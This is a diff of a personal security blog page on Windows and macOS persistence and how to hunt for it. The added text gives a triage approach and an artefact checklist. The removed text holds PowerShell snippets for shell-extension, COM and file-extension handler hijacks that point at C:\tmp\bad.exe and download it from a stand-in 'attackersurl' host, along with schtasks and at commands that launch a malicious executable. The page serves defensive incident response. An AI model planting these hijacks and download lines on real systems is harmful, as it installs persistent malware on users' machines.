@@ -189,28 +189,11 @@
   <aside>
    <nav id="TableOfContents">
   <ul>
-    <li><a href="#windows">Windows</a>
-      <ul>
-        <li><a href="#services">Services</a></li>
-        <li><a href="#autoruns">Autoruns</a></li>
-        <li><a href="#scheduled-tasks">Scheduled tasks</a></li>
-        <li><a href="#dll-hijacking">DLL Hijacking</a>
-          <ul>
-            <li><a href="#search-order-hijacking">Search order hijacking</a></li>
-            <li><a href="#phantom-dll-hijacking">Phantom DLL hijacking</a></li>
-            <li><a href="#dll-sideloading">Dll sideloading</a></li>
-          </ul>
-        </li>
-        <li><a href="#wmi-event-consumers">WMI Event Consumers</a></li>
-        <li><a href="#local-group-policy">Local group policy</a></li>
-        <li><a href="#ms-office-add-in">MS Office Add-In</a></li>
-        <li><a href="#flushing-bios">Flushing BIOS</a></li>
-        <li><a href="#shell-extension-handlers">Shell Extension Handlers</a></li>
-        <li><a href="#com-hijack">COM Hijack</a></li>
-        <li><a href="#extension-handler-hijacking">Extension Handler Hijacking</a></li>
-      </ul>
-    </li>
+    <li><a href="#approach">Approach</a></li>
+    <li><a href="#suspicious-things-windows">Suspicious Things (Windows)</a></li>
+    <li><a href="#windows">Windows</a></li>
     <li><a href="#macos">macOS</a></li>
+    <li><a href="#-references">📚 References</a></li>
   </ul>
 </nav>
  </aside>
@@ -261,103 +244,83 @@
 
 
   <div class="content" itemprop="articleBody">
-    <h2 id="windows">Windows</h2>
-<h3 id="services">Services</h3>
-<p>🔑 <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The executable needs to have certain code and permissions for service behaviour and there are three options to acomplish that:</p>
+    <h2 id="approach">Approach</h2>
+<p>Run a tool to collect all the artefacts for this OS (for example, <code>autorunc.exe</code> for Windows) on the machines in question. Whenever possible, I use CSV format as output because it can be imported either in a SIEM, TimeLine Explorer (Windows) or Numbers/Excel/Google sheets. I prefer the last option because of its pivoting functionality, and it is much easier to deploy.</p>
 <ol>
-<li>New service. If <code>Start</code> value = <code>0x2</code> (see 🔑 above), start the service at boot. Example 🦠: APT1, RIP listener service. ⚒️<code>sc [queryex|qc|qprivs|qtriggerinfo]</code>.</li>
-<li>Hijacking aka Replacement. Required modifications to some existing service. Usually, some rarely used one. Example 🦠: GlassRAT.</li>
-<li>Service failure recovery. Load something 🦠bad when something good and service-like 👼 crashes. You can define what to do if the certain service crashed, usually it&rsquo;s restarting the service. However, this setting can be changed to launch another executable. ⚒️ Kansa Powershell Framework (<code>Get_SvcFail.ps1</code> script), event logs.</li>
-</ol>
-<h3 id="autoruns">Autoruns</h3>
-<p>🔑 <code>SOFTWARE</code> hive (system wide) and <code>NTUSER.dat</code> (user-specific): <code>Software\Microsoft\Windows\CurrentVersion\Run</code>, <code>Software\Microsoft\Windows\CurrentVersion\RunOnce</code>. <code>SOFTWARE</code> hive also has <code>Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> and <code>Software\Microsoft\Windows NT\Winlogon\Userinit</code> (contains reference to the <code>userinit.exe</code>, but can specify other executebles separated with <code>;</code>). File system: <code>%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. 💡 I would also check running processes on the live system to see which processes were started at system start up (time launched is too close to <code>winlogon</code> for example, or any other core process that starts at boot).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">autorunsc -v <span class="o">[</span>options<span class="o">]</span> &gt; result.csv
-</span></span></code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
-<p><code>at.exe</code> (deprecated but can still be used) and <code>schtasks.exe</code>. For <code>at</code> see <code>at*.job</code> and <code>Schdlgu.txt</code> and Task Scheduler and Security Logs for the second one. WinXP: at jobs run with SYSTEM privileges. Files are created here: <code>\Windows\Tasks</code> and <code>\Windows\System32\Tasks</code> (xml duplicate Win7+). Created with: <code>at.exe 22:22:22 C:\mal.exe</code> or <code>schtasks.exe /create /sc daily /tn winsvchost /tr C:\mal.exe</code>.</p>
-<h3 id="dll-hijacking">DLL Hijacking</h3>
-<p>My presentation is available in files section in Russian 🇷🇺.</p>
-<h4 id="search-order-hijacking">Search order hijacking</h4>
-<p>Following is the search order for modern systems:</p>
+<li>Open each file (if there are not too many)
 <ol>
-<li>Dlls in the same direction as the executable that loads it</li>
-<li>KnowDLLs list <code>HKLM\SYSTEM\CurrentControlSet\Control\WOW</code></li>
-<li>Application directory</li>
-<li>C:\Windows\System32</li>
-<li>C:\Windows\system</li>
-<li>C:\Windows</li>
-<li>Application&rsquo;s registered App Paths directories ❓</li>
-<li>PATH env variable</li>
+<li>Filter for untrusted or missing vendors. Such vendors as Google and Firefox might be used to trick the user. It would look like `(Not verified) Firefox.</li>
+<li>Show those enabled ones (if applicable)</li>
+<li>Look at the image path, and use the FindEvil SANS poster or your baseline system profile as a reference for known good to find what&rsquo;s bad</li>
+<li>Look at the hashes and check against known-good.</li>
+<li>Check with a supernova, google Publishes and Description</li>
+<li>Frequency analysis. What stands out? (see the following sections). Find possible suspicious or malicious things.</li>
+<li>Check the triage files from other machines for the same IoCs (<code>Select-String</code>, <code>grep</code> etc).</li>
 </ol>
-<h4 id="phantom-dll-hijacking">Phantom DLL hijacking</h4>
-<p>Some very 👵 old dll is attemted to be loaded even though it&rsquo;s unnecessary. Some of them don&rsquo;t even exist any more, for example, <code>fxsst.dll</code>.</p>
-<h4 id="dll-sideloading">Dll sideloading</h4>
-<p>Side-by side loading (SxS) mechanism to intriduce updated versions of DLL. Can be used to circumvent AV. Example: PlugX RAT. Legitimately signed exe uses SxS to load a malicious dll.</p>
-<h3 id="wmi-event-consumers">WMI Event Consumers</h3>
-<p>A little theory&hellip; . <strong>Event filter</strong> is a condition that should be met in order for something to happen. What&rsquo;s the something? This something is an <strong>Event Consumer</strong> (script or executable). <strong>Binding</strong> is used to ties these two guys up. To setup this thing - use Powershell or <code>mofcomp.exe</code> (compiles <code>MOF</code> files into <code>OBJECTS.DATA</code>).</p>
+</li>
+<li>Stacking (frequency-based outlier analysis)</li>
+<li>Frequency analysis. What stands out? (see the following sections)</li>
+</ol>
 <blockquote>
-<p>⚠️  WMI consumers run with SYSTEM privileges.</p>
+<p>🗒  If the file doesn&rsquo;t have an image path (File not found), it&rsquo;s likely it was moved/deleted and thus is not an active threat.</p>
 </blockquote>
-<p>Init of event filter, consumer and binder are usually contained withing a <code>MOF</code> file used to register new classes into the WMI repo. <code>Set-WmiInstance</code> or <code>CreateInstance</code> can also be used. Just to note, metasploit can do that as well (powershell commands under the hood?). Example 🦠: Stuxnet.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/?</span>
-</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">startup</span> <span class="n">list</span> <span class="n">full</span>
-</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">nicconfig</span> <span class="n">get</span>
-</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="k">process</span> <span class="n">get</span>
-</span></span></code></pre></div><p><strong>Tools</strong> 🛠: Cmdlet <code>Get-WmiOject</code> can identify and delete entries, Kansa Framework, Autoruns (sysinternals).</p>
-<p>📚 <strong>References</strong>: <a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">pentest lab article</a>, SANS <a href="https://www.sans.org/blog/wmic-for-incident-response/">article</a>.</p>
-<h3 id="local-group-policy">Local group policy</h3>
-<h3 id="ms-office-add-in">MS Office Add-In</h3>
-<h3 id="flushing-bios">Flushing BIOS</h3>
-<h3 id="shell-extension-handlers">Shell Extension Handlers</h3>
-<p><code>Computer\HKCU\Software\Classes\*\shellex\ContextMenuHandlers</code>. Same under <code>HKLM</code>. ⚠️ No need to provide admin creds to add a value here, to HKCU only. GUID here is the same as listed in CLSID subkey.  To add a malicious extension one needs to create a unique GUID, add a subkey to CLSID, add a path to <code>dll</code>, and then add a shell extension in the registry above using the same GUID. Use 🛠 OLE/COM object Viewer to see all COM objects registered. Simply clicking an image or a archive file may trigger a malicious act.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\*\shellex\ContectMenuHandlers\BadExt&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;{GUID}&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Name</span> <span class="nv">$Name1</span> <span class="n">-Value</span> <span class="nv">$Value1</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
-</span></span></code></pre></div><h3 id="com-hijack">COM Hijack</h3>
-<p>In Process Monitor filter: <em>Path contains CLSID</em> and <em>Result is NAME NOT FOUND</em>. The entry exists in <code>HKLM\Software\Classes\CLSID\{GUID}</code>, but doesn&rsquo;t exist at <code>HKCU\Software\Classes\CLSID\{GUID}</code>. It looks for the entry in HKCU first, if not found, in HKLM. That&rsquo;s where we can add an entry under HKCU. Powershell needs to be used, since it&rsquo;s a trusted application for registry.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
-</span></span></code></pre></div><h3 id="extension-handler-hijacking">Extension Handler Hijacking</h3>
-<p><code>Computer\HKCR\</code>, subkeys <code>Open</code> and <code>Command</code>. An attackere can&rsquo;t change HKCR or HKLM, but can change <code>HKCU</code> and <code>HKU</code> without admin privileges. Using a proxy within <code>Command</code> will help remain low: <code>proxy.exe &quot;{path/to/real/app}&quot;</code> (starts the meterpreter, for example, then launches the real appliation). ⚠️ Powershell is not necessary, HKU hive can be edited without it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">-PSProvider</span> <span class="n">Registry</span> <span class="n">-Name</span> <span class="n">HKU</span> <span class="n">-Root</span> <span class="n">HKEY_USERS</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKU:\{SID}_Classes\VLC.mp4\shell\Open\Command&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>
-</span></span></code></pre></div><p>Read more about the above techniques: <a href="https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394">Wipe the drive! Stealthy Malware Persistence - Part 1</a> and <a href="https://isc.sans.edu/forums/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Part+2/15406/">Wipe the drive! Stealthy Malware Persistence - Part 2</a>.</p>
+<h2 id="suspicious-things-windows">Suspicious Things (Windows)</h2>
+<p><img src="images/fry-suspicious.jpeg" alt="img"></p>
+<ul>
+<li>Non-system executables like OneDrive are in the <code>System32</code> directory (Windows) or not in <code>Applications</code> (macOS) or <code>/opt</code> (Linux).</li>
+<li>Files with meaningless names and usually one letter or 1 number like <code>1.bat</code> or <code>2.exe</code> or <code>a.exe</code>.</li>
+<li>Be especially careful with drivers/daemons since they have the most power</li>
+<li>WMI entries are also worth checking (Windows only)</li>
+<li>Executables and scripts in a temp directory</li>
+</ul>
+<h2 id="windows">Windows</h2>
+<p>Here is the list of the artefacts for Windows machines. Those marked with ✅ can be collected by autorunsc.exe (if the necessary switch is on).</p>
+<ol>
+<li>BIOS/Boot
+<ol>
+<li>Flashing BIOS</li>
+<li>Boot execute ✅</li>
+</ol>
+</li>
+<li>Windows Registry
+<ol>
+<li>Run and RunOnce ✅</li>
+<li>KnownDlls ✅</li>
+<li>Nefarious COM objects
+<ol>
+<li>Shell extension Handlers</li>
+<li>COM Hijack</li>
+<li>Extention Handler Hijacking</li>
+</ol>
+</li>
+<li>Appinit DLLs ✅</li>
+</ol>
+</li>
+<li>Explorer add-ons ✅</li>
+<li>Sidebar gadgets ✅</li>
+<li>Image hijacks ✅
+<ol>
+<li>DLL hijacking❓
+2. Phantom
+3. Sideloading</li>
+</ol>
+</li>
+<li>Local group policies</li>
+<li>IE add-ons ✅</li>
+<li>Logon startups ✅</li>
+<li>WMI ✅</li>
+<li>MS Office addons ✅</li>
+<li>Printer mon dll ✅</li>
+<li>LSA sec providers ✅</li>
+<li>Autostart services and non-disabled drivers ✅</li>
+<li>Winlogon entries ✅</li>
+<li>Scheduled tasks ✅</li>
+<li>Winlock protocol and net providers ✅</li>
+</ol>
 <h2 id="macos">macOS</h2>
-<p><code>System Preferences -&gt; Users &amp; Groups -&gt; Login Items</code>. Additional: SDF podcast.</p>
-<p>How to determine if it&rsquo;s malicious? Well, the sure way is only to reverse engineer it, but it is time consuming. So, you need to narrow down the candidates first. There are a couple of indicators that are commonly seen in malware.</p>
+<h2 id="-references">📚 References</h2>
+<p>[<a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching">1</a>] DLL Search order, Microsoft Docs
+[<a href="https://github.com/beahunt3r/Windows-Hunting">2</a>] Windows artefacts DB</p>
 
   </div>
 </article>
@@ -390,7 +353,7 @@
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
   
 
   
